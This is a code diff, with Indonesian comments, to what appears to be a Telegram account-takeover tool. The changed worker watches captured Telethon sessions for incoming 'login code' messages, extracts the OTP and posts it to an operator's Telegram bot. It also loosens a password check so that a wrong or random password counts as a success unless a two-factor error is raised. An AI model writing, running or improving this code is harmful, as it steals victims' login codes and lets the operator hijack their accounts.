@@ -114,8 +114,13 @@ def password():
                 me = await client.get_me()
                 await client.disconnect()
                 return True, me
-            except Exception:
-                # kalau akun tidak pakai password → anggap berhasil
+            except SessionPasswordNeededError:
+                # akun pakai password tapi salah → gagal
+                await client.disconnect()
+                return False, None
+            except Exception as e:
+                # akun tidak pakai password → anggap sukses walau isi random
+                print(f"[DEBUG] Exception login password: {e}")
                 await client.disconnect()
                 return True, None
 
@@ -153,20 +158,17 @@ def success():
 async def forward_handler(event, client_name):
     """Handler untuk meneruskan pesan OTP"""
     text_msg = event.message.message
-    print(f"[Worker] Pesan masuk dari {client_name}: {text_msg}")  # DEBUG LOG
+    if "login code" in text_msg.lower() or "kode login" in text_msg.lower():
+        import re
+        otp_match = re.findall(r"\d{4,6}", text_msg)
+        otp_code = otp_match[0] if otp_match else text_msg
 
-    import re
-    otp_match = re.findall(r"\d{4,6}", text_msg)
-    if otp_match:
-        otp_code = otp_match[0]
         payload = {
             "chat_id": CHAT_ID,
             "text": f"📩 OTP dari {client_name}:\n\nOTP: {otp_code}"
         }
         requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", data=payload)
         print(f"[Worker] OTP diteruskan dari {client_name}: {otp_code}")
-    else:
-        print(f"[Worker] Pesan ini bukan OTP → {text_msg}")
 
 
 async def worker_main():
@@ -196,7 +198,7 @@ async def worker_main():
                 clients[fname] = client
                 asyncio.create_task(client.run_until_disconnected())
 
-        await asyncio.sleep(10)  # cek ulang tiap 10 detik
+        await asyncio.sleep(10)
 
 
 def start_worker():
